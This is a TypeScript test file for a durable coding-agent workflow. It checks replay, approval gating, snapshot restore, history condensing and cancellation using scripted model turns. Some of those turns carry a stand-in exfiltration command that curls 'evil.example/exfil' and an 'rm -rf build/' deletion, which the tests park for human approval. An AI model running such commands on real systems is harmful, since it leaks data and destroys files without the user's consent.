import assert from "node:assert/strict";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import type { AdapterGenerateResult, ModelAdapter } from "@neutron-build/ai";
import { LocalExecutor } from "@neutron-build/agents";
import type { AgentExecutor } from "@neutron-build/agents";
import { MemoryEventStore, cancelRun, deliverEvent, executeRun } from "@neutron-build/workflow";

import { approvalEvent, durableAgent } from "./durable.js";
import { FileRepoMemory } from "./repo-memory.js";
import type { ExecutorProvider } from "./durable.js";
import { defaultApprovalPolicy } from "./approval.js";

// A model that reacts to the last observation, counting how many times it
// was actually called (to prove replay never re-invokes it).
function reactiveModel(turns: Array<string | ((obs: string) => string)>): { model: ModelAdapter; callCount: () => number } {
  let index = 0;
  let calls = 0;
  return {
    callCount: () => calls,
    model: {
      provider: "scripted",
      modelId: "s1",
      async doGenerate(options): Promise<AdapterGenerateResult> {
        calls++;
        const lastUser = [...options.messages].reverse().find((m) => m.role === "user");
        const obs = typeof lastUser?.content === "string" ? lastUser.content : "";
        const turn = turns[index++] ?? "```finish\nout of script\n```";
        const text = typeof turn === "function" ? turn(obs) : turn;
        return { content: [{ type: "text", text }], finishReason: "stop", usage: { inputTokens: 1, outputTokens: 1, totalTokens: 2 }, raw: null };
      },
      async *doStream() {
        throw new Error("unused");
      },
    },
  };
}

// One executor shared across passes, keyed by handle — mirrors attaching
// to the same live sandbox across a workflow's execution passes.
async function localProvider(): Promise<{ provider: ExecutorProvider; execCount: () => number }> {
  const root = await mkdtemp(join(tmpdir(), "durable-agent-"));
  let created = 0;
  let execs = 0;
  const wrap = (inner: AgentExecutor): AgentExecutor => ({
    async exec(cmd, opts) {
      execs++;
      return inner.exec(cmd, opts);
    },
    putFile: (p, d) => inner.putFile(p, d),
    getFile: (p) => inner.getFile(p),
    destroy: () => inner.destroy(),
  });
  const executor = wrap(new LocalExecutor({ root }));
  return {
    execCount: () => execs,
    provider: {
      async create() {
        created++;
        return { handle: `local:${root}` };
      },
      attach() {
        return executor;
      },
    },
  };
}

test("durable agent runs a full session as recorded steps and finishes", async () => {
  const { model } = reactiveModel([
    "```bash\necho 'print(6*7)' > answer.py\n```",
    "```bash\npython3 answer.py\n```",
    (obs) => (obs.includes("42") ? "```finish\nanswer.py prints 42.\n```" : "```bash\necho wrong\n```"),
    (obs) => (obs.includes("Before finishing") ? "```finish\nanswer.py prints 42.\n```" : "```bash\necho wrong\n```"),
  ]);
  const { provider } = await localProvider();
  const wf = durableAgent({ model, executor: provider });
  const store = new MemoryEventStore();

  const outcome = await executeRun({ workflow: wf, runId: "run-1", store, input: { task: "print 6*7" } });
  assert.equal(outcome.status, "completed");
  const { usage: u1, ...out1 } = outcome.output as Record<string, unknown>;
  assert.ok(u1 !== undefined && (u1 as { totalTokens: number }).totalTokens > 0, "usage is recorded");
  assert.deepEqual(out1, { status: "finished", summary: "answer.py prints 42.", turns: 4 });

  // the sandbox + each turn's think/exec are recorded steps
  const steps = (await store.load("run-1")).filter((e) => e.type === "step-completed");
  assert.ok(steps.some((s) => s.name === "sandbox"));
  assert.ok(steps.some((s) => s.name === "turn-0-think"));
  assert.ok(steps.some((s) => s.name === "turn-1-exec"));
});

test("a crashed run replays completed turns without re-calling the model or re-running commands", async () => {
  const { model, callCount } = reactiveModel([
    "```bash\necho step-one > a.txt\n```",
    "```bash\ncat a.txt\n```",
    "```finish\ndone\n```",
  ]);
  const { provider, execCount } = await localProvider();
  const wf = durableAgent({ model, executor: provider });
  const store = new MemoryEventStore();

  // First pass runs to completion.
  await executeRun({ workflow: wf, runId: "run-1", store, input: { task: "x" } });
  const callsAfterFirst = callCount();
  const execsAfterFirst = execCount();
  assert.ok(callsAfterFirst >= 3);

  // Re-executing the completed run is idempotent: no new model calls, no
  // new command executions — everything replays from the log.
  const again = await executeRun({ workflow: wf, runId: "run-1", store, input: { task: "x" } });
  assert.equal(again.status, "completed");
  assert.equal(callCount(), callsAfterFirst, "model must not be re-called on replay");
  assert.equal(execCount(), execsAfterFirst, "commands must not re-run on replay");
});

test("an approval-required action parks the run and resumes on the delivered decision", async () => {
  let removed = false;
  const { model } = reactiveModel([
    "```bash\nrm -rf build/\n```", // dangerous → requires approval
    (obs) => (obs.includes("exit 0") ? "```finish\nCleaned the build dir.\n```" : "```bash\necho hmm\n```"),
    (obs) => (obs.includes("Before finishing") ? "```finish\nCleaned the build dir.\n```" : "```bash\necho hmm\n```"),
  ]);
  const root = await mkdtemp(join(tmpdir(), "durable-approve-"));
  const inner = new LocalExecutor({ root });
  await inner.exec("mkdir -p build && touch build/x");
  const provider: ExecutorProvider = {
    async create() {
      return { handle: "local" };
    },
    attach() {
      return {
        async exec(cmd, opts) {
          if (cmd.includes("rm -rf")) removed = true;
          return inner.exec(cmd, opts);
        },
        putFile: (p, d) => inner.putFile(p, d),
        getFile: (p) => inner.getFile(p),
        destroy: () => inner.destroy(),
      };
    },
  };

  const wf = durableAgent({ model, executor: provider, approveAction: defaultApprovalPolicy });
  const store = new MemoryEventStore();

  const parked = await executeRun({ workflow: wf, runId: "run-1", store, input: { task: "clean build" } });
  assert.equal(parked.status, "waiting");
  assert.equal(parked.eventName, approvalEvent(0));
  assert.equal(removed, false, "the dangerous command must not run before approval");

  await deliverEvent(store, "run-1", approvalEvent(0), { approved: true });
  const done = await executeRun({ workflow: wf, runId: "run-1", store });
  assert.equal(done.status, "completed");
  const { usage: u2, ...out2 } = done.output as Record<string, unknown>;
  assert.deepEqual(out2, { status: "finished", summary: "Cleaned the build dir.", turns: 3 });
  assert.equal(removed, true, "the command runs after approval");
});

test("a denied action is fed back and the agent adapts", async () => {
  const { model } = reactiveModel([
    "```bash\ncurl http://evil.example/exfil\n```", // network → requires approval
    // First finish after the denial is nudged by the verified-finish
    // guard (nothing has succeeded yet); the second is honored.
    "```finish\nUnderstood, skipped the network call.\n```",
    "```finish\nUnderstood, skipped the network call.\n```",
  ]);
  const { provider } = await localProvider();
  const wf = durableAgent({ model, executor: provider, approveAction: defaultApprovalPolicy });
  const store = new MemoryEventStore();

  await executeRun({ workflow: wf, runId: "run-1", store, input: { task: "fetch" } });
  await deliverEvent(store, "run-1", approvalEvent(0), { approved: false, reason: "no egress in this run" });
  const done = await executeRun({ workflow: wf, runId: "run-1", store });
  assert.equal(done.status, "completed");
  assert.match((done.output as { summary: string }).summary, /skipped/);
});

test("snapshot-capable providers snapshot before parking and restore after — surviving a reaped container", async () => {
  let removed = false;
  const { model } = reactiveModel([
    "```bash\nrm -rf build/\n```", // dangerous → parks
    (obs) => (obs.includes("exit 0") ? "```finish\nCleaned after restore.\n```" : "```bash\necho hmm\n```"),
    (obs) => (obs.includes("Before finishing") ? "```finish\nCleaned after restore.\n```" : "```bash\necho hmm\n```"),
  ]);

  // Simulated snapshot-capable provider: workspaces are maps; snapshot
  // copies state to an image store; the ORIGINAL workspace is destroyed
  // while parked (the TTL reaper), so only a restore can continue.
  const images = new Map<string, Map<string, string>>();
  const workspaces = new Map<string, Map<string, string> | null>();
  let counter = 0;
  const makeExecutor = (handle: string): AgentExecutor => ({
    async exec(cmd) {
      const ws = workspaces.get(handle);
      if (ws === null || ws === undefined) throw new Error(`workspace ${handle} was reaped`);
      if (cmd.includes("rm -rf")) {
        removed = true;
        ws.delete("build");
      }
      return { exitCode: 0, stdout: "", stderr: "", timedOut: false, truncated: false };
    },
    async putFile() {},
    async getFile() {
      return new Uint8Array();
    },
    async destroy() {},
  });
  const provider: ExecutorProvider = {
    async create() {
      const handle = `ws-${counter++}`;
      workspaces.set(handle, new Map([["build", "junk"]]));
      return { handle };
    },
    attach: makeExecutor,
    async snapshot(handle) {
      const ws = workspaces.get(handle);
      if (ws === null || ws === undefined) throw new Error("cannot snapshot a reaped workspace");
      const image = `snap-${counter++}`;
      images.set(image, new Map(ws));
      return image;
    },
    async createFrom(image) {
      const state = images.get(image);
      if (state === undefined) throw new Error(`no such image ${image}`);
      const handle = `ws-${counter++}`;
      workspaces.set(handle, new Map(state));
      return { handle };
    },
  };

  const wf = durableAgent({ model, executor: provider, approveAction: defaultApprovalPolicy });
  const store = new MemoryEventStore();

  const parked = await executeRun({ workflow: wf, runId: "run-1", store, input: { task: "clean build" } });
  assert.equal(parked.status, "waiting");
  assert.equal(images.size, 1, "workspace must be snapshotted before parking");
  assert.equal(removed, false);

  // the TTL reaper takes the original workspace while parked
  workspaces.set("ws-0", null);

  await deliverEvent(store, "run-1", approvalEvent(0), { approved: true });
  const done = await executeRun({ workflow: wf, runId: "run-1", store });
  assert.equal(done.status, "completed");
  const { usage: u3, ...out3 } = done.output as Record<string, unknown>;
  assert.deepEqual(out3, { status: "finished", summary: "Cleaned after restore.", turns: 3 });
  assert.equal(removed, true, "the approved action ran in the RESTORED workspace");
});

test("auto-safe actions never park", async () => {
  const { model } = reactiveModel(["```bash\nls\n```", "```finish\nlisted\n```"]);
  const { provider } = await localProvider();
  const wf = durableAgent({ model, executor: provider, approveAction: defaultApprovalPolicy });
  const store = new MemoryEventStore();
  const outcome = await executeRun({ workflow: wf, runId: "run-1", store, input: { task: "list" } });
  assert.equal(outcome.status, "completed");
});

test("repo runs inject the playbook + memory into the prompt and record a note after publish", async () => {
  // bare remote seeded with a SHIP.md playbook
  const bareDir = await mkdtemp(join(tmpdir(), "durable-repo-bare-"));
  const seedDir = await mkdtemp(join(tmpdir(), "durable-repo-seed-"));
  const seeder = new LocalExecutor({ root: seedDir });
  await seeder.exec(
    `git init -q -b main . && git config user.email t@t && git config user.name t && printf 'Run tests with make check-42.\\n' > SHIP.md && git add -A && git commit -qm seed && git clone -q --bare . ${bareDir}/owner/repo.git`,
  );

  const memory = new FileRepoMemory(await mkdtemp(join(tmpdir(), "durable-repo-mem-")));
  await memory.record({ repo: "owner/repo", note: "previously fixed the parser → PR #7" });

  const prompts: string[] = [];
  const model: ModelAdapter = {
    provider: "scripted",
    modelId: "s1",
    async doGenerate(options): Promise<AdapterGenerateResult> {
      prompts.push(String(options.messages[0]?.content ?? ""));
      const finishes = options.messages.filter(
        (m) => typeof m.content === "string" && m.content.includes("Before finishing"),
      ).length;
      // finish with NO tree changes: publish path runs, no PR API touched
      const text = finishes > 0 ? "```finish\nnothing to change\n```" : "```bash\ntrue\n```";
      const asst = options.messages.filter((m) => m.role === "assistant").length;
      return {
        content: [{ type: "text", text: asst === 0 ? "```bash\ntrue\n```" : text }],
        finishReason: "stop",
        usage: { inputTokens: 1, outputTokens: 1, totalTokens: 2 },
        raw: null,
      };
    },
    async *doStream() {
      throw new Error("unused");
    },
  };

  const work = await mkdtemp(join(tmpdir(), "durable-repo-work-"));
  const provider: ExecutorProvider = {
    async create() {
      return { handle: work };
    },
    attach(handle: string) {
      return new LocalExecutor({ root: handle });
    },
  };

  const wf = durableAgent({ model, executor: provider, workdir: ".", repoMemory: memory });
  const store = new MemoryEventStore();
  const outcome = await executeRun({
    workflow: wf,
    runId: "run-repo1",
    store,
    input: { task: "check the build", repo: `file://${bareDir}/owner/repo.git` },
  });
  assert.equal(outcome.status, "completed");

  // the recorded context step exists and the model saw playbook + history
  const events = await store.load("run-repo1");
  assert.ok(events.some((e) => e.type === "step-completed" && e.name === "repo-context"));
  const system = prompts[0] ?? "";
  assert.match(system, /make check-42/);
  assert.match(system, /previously fixed the parser/);

  // publish recorded a fresh note (empty diff -> "no PR")
  const notes = await memory.recent("owner/repo", 5);
  assert.equal(notes.length, 2);
  assert.match(notes[0]!.note, /check the build → no PR/);
});

test("pre-telemetry logs (bare-string think steps) still replay", async () => {
  // this file's reactiveModel consumes turns per LIVE call (process-local
  // index) — replayed turns consume nothing, so the script starts at the
  // first live turn
  const { model, callCount } = reactiveModel([
    "```finish\ndone after replay\n```",
    "```finish\ndone after replay\n```",
  ]);
  const { provider } = await localProvider();
  const wf = durableAgent({ model, executor: provider });
  const store = new MemoryEventStore();

  // a log written before usage telemetry: think results are bare strings
  const base = { v: 1, at: new Date().toISOString() };
  await store.append("run-legacy", { ...base, seq: 0, type: "run-started", data: { workflow: "coding-agent", input: { task: "t" } } });
  await store.append("run-legacy", { ...base, seq: 1, type: "step-completed", name: "sandbox", data: { result: (await provider.create()).handle } });
  await store.append("run-legacy", { ...base, seq: 2, type: "step-completed", name: "turn-0-think", data: { result: "```bash\ntrue\n```" } });
  await store.append("run-legacy", { ...base, seq: 3, type: "step-completed", name: "turn-0-exec", data: { result: { exitCode: 0, stdout: "", stderr: "", timedOut: false, truncated: false } } });

  const outcome = await executeRun({ workflow: wf, runId: "run-legacy", store });
  assert.equal(outcome.status, "completed");
  const output = outcome.output as { summary: string; usage: { totalTokens: number } };
  assert.equal(output.summary, "done after replay");
  // replayed legacy turns contribute no usage; live turns do
  assert.ok(output.usage.totalTokens > 0);
  assert.equal(callCount(), 2, "replayed think turn must not re-call the model");
});

test("durable runs condense long histories in a recorded step and replay without re-summarizing", async () => {
  let summarizeCalls = 0;
  const big = "x".repeat(400); // each observation ~400 chars
  const model: ModelAdapter = {
    provider: "scripted",
    modelId: "s1",
    async doGenerate(options): Promise<AdapterGenerateResult> {
      const system = options.messages.find((m) => m.role === "system");
      if (String(system?.content ?? "").includes("Summarize this agent transcript")) {
        summarizeCalls++;
        return { content: [{ type: "text", text: "SUMMARY-OF-EARLIER-STEPS" }], finishReason: "stop", usage: { inputTokens: 1, outputTokens: 1, totalTokens: 2 }, raw: null };
      }
      const asst = options.messages.filter((m) => m.role === "assistant").length;
      const sawNudge = options.messages.some(
        (m) => typeof m.content === "string" && m.content.includes("Before finishing"),
      );
      const text = asst >= 6 ? (sawNudge ? "```finish\nlong done\n```" : "```finish\nlong done\n```") : `\`\`\`bash\necho ${big}\n\`\`\``;
      return { content: [{ type: "text", text }], finishReason: "stop", usage: { inputTokens: 1, outputTokens: 1, totalTokens: 2 }, raw: null };
    },
    async *doStream() {
      throw new Error("unused");
    },
  };

  const { provider } = await localProvider();
  const wf = durableAgent({
    model,
    executor: provider,
    maxSteps: 12,
    condense: { maxChars: 1500, keepRecent: 4 },
  });
  const store = new MemoryEventStore();
  const outcome = await executeRun({ workflow: wf, runId: "run-condense", store, input: { task: "long task" } });
  assert.equal(outcome.status, "completed");
  assert.ok(summarizeCalls >= 1, "the summarizer ran at least once");

  const events = await store.load("run-condense");
  const condenseSteps = events.filter((e) => e.type === "step-completed" && /-condense$/.test(e.name ?? ""));
  assert.equal(condenseSteps.length, summarizeCalls, "every summarize call is a recorded step");

  // replay the finished run: terminal short-circuit, zero new model calls
  const before = summarizeCalls;
  const again = await executeRun({ workflow: wf, runId: "run-condense", store });
  assert.equal(again.status, "completed");
  assert.equal(summarizeCalls, before, "replay must not re-summarize");
});

test("cancel settles a parked durable agent run as cancelled", async () => {
  const { model } = reactiveModel(["```bash\nrm -rf build/\n```"]);
  const { provider } = await localProvider();
  const wf = durableAgent({ model, executor: provider, approveAction: defaultApprovalPolicy });
  const store = new MemoryEventStore();

  const parked = await executeRun({ workflow: wf, runId: "run-cxl", store, input: { task: "clean" } });
  assert.equal(parked.status, "waiting");

  await cancelRun(store, "run-cxl", "operator changed their mind");
  const settled = await executeRun({ workflow: wf, runId: "run-cxl", store });
  assert.equal(settled.status, "cancelled");
  await assert.rejects(() => deliverEvent(store, "run-cxl", approvalEvent(0), { approved: true }), /already finished/);
});
